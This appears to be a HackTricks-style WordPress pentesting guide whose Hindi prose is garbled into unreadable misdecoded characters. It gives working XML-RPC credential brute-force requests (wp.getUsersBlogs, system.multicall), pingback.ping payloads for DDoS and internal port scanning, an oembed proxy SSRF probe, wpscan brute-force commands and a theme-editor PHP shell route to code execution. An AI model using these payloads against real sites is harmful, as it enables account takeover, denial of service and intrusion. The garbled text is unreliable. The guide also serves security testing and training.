# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА

- **рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ** рдлрд╝рд╛рдЗрд▓реЗрдВ рдЗрд╕реА рдЬрдЧрд╣ рдЬрд╛рддреА рд╣реИрдВ: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк theme рдХреЗ рдХреБрдЫ php рдмрджрд▓рдХрд░ RCE рд╣рд╛рд╕рд┐рд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╢рд╛рдпрдж рд╡рд╣реА path рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░реЗрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: theme **twentytwelve** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рдЖрдк рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **рдПрдХ рдФрд░ рдЙрдкрдпреЛрдЧреА URL рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` рдореЗрдВ рдЖрдк database рдХреЗ root password рдЬреИрд╕реА рдЬрд╛рдирдХрд╛рд░реА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
- рдЬрд╛рдБрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд▓реЙрдЧрд┐рди paths: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ WordPress рдХрд╛ versionред
- `wp-activate.php` рдирдпрд╛ WordPress рд╕рд╛рдЗрдЯ рд╕реЗрдЯрдЕрдк рдХрд░рддреЗ рд╕рдордп рдИрдореЗрд▓ activation рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред
- Login рдлрд╝реЛрд▓реНрдбрд░ (рдЫрд┐рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╛рдо рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ WordPress рдХреА рдЙрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЛ рджрд░реНрд╢рд╛рддреА рд╣реИ рдЬреЛ HTTP рдХреЛ transport mechanism рдФрд░ XML рдХреЛ encoding mechanism рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛ рдЯреНрд░рд╛рдВрд╕рдорд┐рдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛рддреА рд╣реИред рдЗрд╕ рддрд░рд╣ рдХреА рд╕рдВрдЪрд╛рд░ рд╡рд┐рдзрд┐ рдХреЛ WordPress рдХреЗ [REST API](https://developer.wordpress.org/rest-api/reference) рдиреЗ рдмрджрд▓ рджрд┐рдпрд╛ рд╣реИред
- `wp-content` рдлрд╝реЛрд▓реНрдбрд░ рдореБрдЦреНрдп рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реИ рдЬрд╣рд╛рдБ plugins рдФрд░ themes рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред
- `wp-content/uploads/` рд╡рд╣ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реИ рдЬрд╣рд╛рдБ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдкрд░ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдХреЛрдИ рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВред
- `wp-includes/` рдпрд╣ рд╡рд╣ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реИ рдЬрд╣рд╛рдБ core рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ certificates, fonts, JavaScript рдлрд╝рд╛рдЗрд▓реЗрдВ, рдФрд░ widgetsред
- `wp-sitemap.xml` WordPress рдХреЗ version 5.5 рдФрд░ рдЙрд╕рд╕реЗ рдмрдбрд╝реЗ рдореЗрдВ, WordPress рд╕рднреА public posts рдФрд░ publicly queryable post types рдФрд░ taxonomies рдХреЗ рд╕рд╛рде рдПрдХ sitemap XML рдлрд╝рд╛рдЗрд▓ рдЬреЗрдирд░реЗрдЯ рдХрд░рддрд╛ рд╣реИред

**Post exploitation**

- `wp-config.php` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ WordPress рдХреЛ database рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ database рдХрд╛ рдирд╛рдо, database host, username рдФрд░ password, authentication keys рдФрд░ salts, рдФрд░ database table prefixред рдпрд╣ configuration рдлрд╝рд╛рдЗрд▓ DEBUG mode рдХреЛ activate рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЬреЛ troubleshooting рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### Users Permissions

- **Administrator**
- **Editor**: рдЕрдкрдиреЗ рдФрд░ рдЕрдиреНрдп рдХреЗ posts рдХреЛ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ
- **Author**: рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ posts рдХреЛ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ
- **Contributor**: рдЕрдкрдиреЗ posts рд▓рд┐рдЦрддрд╛ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЙрдиреНрд╣реЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛
- **Subscriber**: рдкреЛрд╕реНрдЯ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдкрдирд╛ рдкреНрд░реЛрдлрд╛рдЗрд▓ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ

## **Passive Enumeration**

### **Get WordPress version**

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк `/license.txt` рдпрд╛ `/readme.html` рдлрд╝рд╛рдЗрд▓реЗрдВ рдвреВрдБрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ

рдкреЗрдЬ рдХреЗ **source code** рдХреЗ рдЕрдВрджрд░ (рдЙрджрд╛рд╣рд░рдг [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS рд▓рд┐рдВрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ

![](<../../images/image (533).png>)

- JavaScript рдлрд╝рд╛рдЗрд▓реЗрдВ

![](<../../images/image (524).png>)

### рдкреНрд▓рдЧрдЗрдиреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рдереАрдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рд╕рд╛рдорд╛рдиреНрдп рддреМрд░ рдкрд░ рд╕рдВрд╕реНрдХрд░рдг рдирд┐рдХрд╛рд▓рдирд╛
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

рд╢рд╛рдпрдж рдЖрдк рд╕рднреА Plugins рдФрд░ Themes рдХреЛ рдЦреЛрдЬ рдкрд╛рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛрдЧрд╛ред рдЗрдиреНрд╣реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ **actively Brute Force a list of Plugins and Themes** рдХрд░рдирд╛ рд╣реЛрдЧрд╛ (рдЖрд╢рд╛ рд╣реИ рдХрд┐ рд╣рдорд╛рд░реЗ рд▓рд┐рдП рдРрд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЯреВрд▓ рдореМрдЬреВрдж рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдпреЗ рд╕реВрдЪрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ)ред

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛

- **ID Brute:** рдЖрдк WordPress рд╕рд╛рдЗрдЯ рд╕реЗ рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ Brute Forcing users IDs рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
рдпрджрд┐ response рдХреЛрдб **200** рдпрд╛ **30X** рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ id **рдорд╛рдиреНрдп** рд╣реИред рдпрджрд┐ response рдХреЛрдб **400** рд╣реИ, рддреЛ id **рдЕрдорд╛рдиреНрдп** рд╣реИред

- **wp-json:** рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд╡реЗрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
рдПрдХ рдФрд░ `/wp-json/` endpoint рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдкреЛрд╕реНрдЯ рдХреА рд╣реИред **рд╕рд┐рд░реНрдл рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдПрдЧреА рдЬрд┐рдирдХреЗ рд▓рд┐рдП рдпрд╣ рдлреАрдЪрд░ рд╕рдХреНрд╖рдо рд╣реИред**

рд╕рд╛рде рд╣реА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **/wp-json/wp/v2/pages** IP addresses рдХреЛ leak рдХрд░ рд╕рдХрддрд╛ рд╣реИред

- **Login username enumeration**: рдЬрдм **`/wp-login.php`** рдкрд░ рд▓реЙрдЧрд┐рди рдХрд░рддреЗ рд╕рдордп **рд╕рдВрджреЗрд╢** рдЗрд╕ рдмрд╛рдд рдХреЗ рдЕрдиреБрд╕рд╛рд░ **рдЕрд▓рдЧ** рд╣реЛрддрд╛ рд╣реИ рдХрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ**ред

### XML-RPC

рдпрджрд┐ `xml-rpc.php` рд╕рдХреНрд░рд┐рдп рд╣реИ, рддреЛ рдЖрдк credentials brute-force рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдкрд░ DoS attacks рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ [using this](https://github.com/relarizky/wpxploit))ред

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**рдЬрд╛рдБрдЪ рдХрд░реЗрдВ**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** рдпрд╛ **`metaWeblog.getUsersBlogs`** рдХреБрдЫ рдРрд╕реЗ рдореЗрдердб рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ brute-force credentials рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рдкрд╛ рд▓реЗрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
рдпрджрд┐ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╡реИрдз рдирд╣реАрдВ рд╣реИрдВ рддреЛ 200 рдХреЛрдб рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рдХреЗ рдЕрдВрджрд░ рд╕рдВрджреЗрд╢ _"Incorrect username or password"_ рджрд┐рдЦрд╛рдИ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдПред

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

рд╕рд╣реА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкрде рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

рдпрд╣ рддрд░реАрдХрд╛ programs рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ humans рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ, рдФрд░ рдкреБрд░рд╛рдирд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ 2FA рдХреЛ рд╕рдкреЛрд░реНрдЯ рдирд╣реАрдВ рдХрд░рддрд╛ред рддреЛ, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╡реИрдз creds рд╣реИрдВ рдкрд░ рдореБрдЦреНрдп рдкреНрд░рд╡реЗрд╢ 2FA рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, **рддреЛ рдЖрдк xmlrpc.php рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрди creds рдХреЗ рд╕рд╛рде 2FA рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рддреЗ рд╣реБрдП login рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк console рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреЛ рд╕рднреА actions рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡реЗ рд╕рднреА рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдЖрдк рдлрд┐рд░ рднреА RCE рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕рд╛ Ippsec рдЗрд╕реЗ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) рдореЗрдВ рд╕рдордЭрд╛рддреЗ рд╣реИрдВред

**DDoS or port scanning**

рдЕрдЧрд░ рдЖрдк list рдХреЗ рдЕрдВрджрд░ _**pingback.ping**_ method рдкрд╛ рд▓реЗрддреЗ рд╣реИрдВ рддреЛ рдЖрдк Wordpress рдХреЛ рдХрд┐рд╕реА рднреА host/port рдкрд░ arbitrary request рднреЗрдЬрд╡рд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕реЗ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдХреЗ рдЖрдк **рд╣рдЬрд╝рд╛рд░реЛрдВ** Wordpress **sites** рдХреЛ рдХрд┐рд╕реА рдПрдХ **location** рдХреЛ **access** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВ (рдЬрд┐рд╕рд╕реЗ рдЙрд╕ location рдкрд░ **DDoS** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ) рдпрд╛ рдЖрдк рдЗрд╕реЗ **Wordpress** рдХреЛ рдХрд┐рд╕реА internal **network** рдХреЛ **scan** рдХрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдк рдХрд┐рд╕реА рднреА рдкреЛрд░реНрдЯ рдХрд╛ рд╕рдВрдХреЗрдд рджреЗ рд╕рдХрддреЗ рд╣реИрдВ)ред
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

рдпрджрд┐ рдЖрдкрдХреЛ **faultCode** рдХрд╛ рдорд╛рди **0** рд╕реЗ рдмрдбрд╝рд╛ (17) рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИред

рдкрд┐рдЫрд▓реЗ рд╕реЗрдХреНрд╢рди рдореЗрдВ **`system.multicall`** рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рджреЗрдЦрд┐рдП рддрд╛рдХрд┐ рдпрд╣ рд╕реАрдЦрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ DDoS рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

This file usually exists under the root of the Wordpress site: **`/wp-cron.php`**\
рдЬрдм рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **accessed** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ "**heavy**" MySQL **query** perform рдХреА рдЬрд╛рддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ **attackers** рджреНрд╡рд╛рд░рд╛ **cause** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **DoS** рдХреЗ рд▓рд┐рдпреЗред\
рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, `wp-cron.php` рд╣рд░ рдкреЗрдЬ рд▓реЛрдб рдкрд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬрдм рднреА рдХреЛрдИ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛрдИ рднреА Wordpress рдкреЗрдЬ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХрд░рддрд╛ рд╣реИ), рдЬреЛ рд╣рд╛рдИ-рдЯреНрд░реИрдлрд╝рд┐рдХ рд╕рд╛рдЗрдЯреНрд╕ рдкрд░ рд╕рдорд╕реНрдпрд╛рдПрдБ (DoS) рдкреИрджрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╕реБрдЭрд╛рд╡ рд╣реИ рдХрд┐ Wp-Cron рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░реЗрдВ рдФрд░ host рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ cronjob рдмрдирд╛рдПрдВ рдЬреЛ рдЖрд╡рд╢реНрдпрдХ рдХреНрд░рд┐рдпрд╛рдПрдБ рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░ рдХрд░реЗ (рдмрд┐рдирд╛ рд╕рдорд╕реНрдпрд╛рдПрдБ рдЙрддреНрдкрдиреНрди рдХрд┐рдП)ред

### /wp-json/oembed/1.0/proxy - SSRF

рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдХрд┐ _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ рдХреЛ access рдХрд░рдиреЗ рдХреА рдФрд░ Wordpress рд╕рд╛рдЗрдЯ рд╕рдВрднрд╡рддрдГ рдЖрдк рдкрд░ рдПрдХ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдХрд░ рд╕рдХрддреА рд╣реИред

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

рдпрд╣ рдЯреВрд▓ рдЬрд╛рдБрдЪрддрд╛ рд╣реИ рдХрд┐ **methodName: pingback.ping** рдФрд░ path **/wp-json/oembed/1.0/proxy** рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдФрд░ рдпрджрд┐ рдореМрдЬреВрдж рд╣реИ рддреЛ рдпрд╣ рдЗрдиреНрд╣реЗрдВ exploit рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЯреВрд▓реНрд╕
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## рдПрдХ рдмрд┐рдЯ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдЕрд╕рд▓ рд╣рдорд▓реЗ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдпрд╣ рдПрдХ рдЬрд┐рдЬреНрдЮрд╛рд╕рд╛ рд╣реИред CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) рдореЗрдВ рдЖрдк рдХрд┐рд╕реА рднреА wordpress рдлрд╝рд╛рдЗрд▓ рдХрд╛ 1 рдмрд┐рдЯ flip рдХрд░ рд╕рдХрддреЗ рдереЗред рдЗрд╕рд▓рд┐рдП рдЖрдк рдлрд╝рд╛рдЗрд▓ `/var/www/html/wp-includes/user.php` рдХреЗ рдкреЛрдЬрд┐рд╢рди `5389` рдХреЗ рдмрд┐рдЯ рдХреЛ flip рдХрд░рдХреЗ NOT (`!`) рдСрдкрд░реЗрд╢рди рдХреЛ NOP рдХрд░ рд╕рдХрддреЗ рдереЗред
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **рдкреИрдирд▓ RCE**

**рдереАрдо рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП php рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ (admin credentials рдЖрд╡рд╢реНрдпрдХ)**

Appearance тЖТ Theme Editor тЖТ 404 Template (рджрд╛рдИрдВ рддрд░рдлрд╝)

php рд╢реЗрд▓ рдХреЗ рд▓рд┐рдП рдХрдВрдЯреЗрдВрдЯ рдмрджрд▓реЗрдВ:

![](<../../images/image (384).png>)

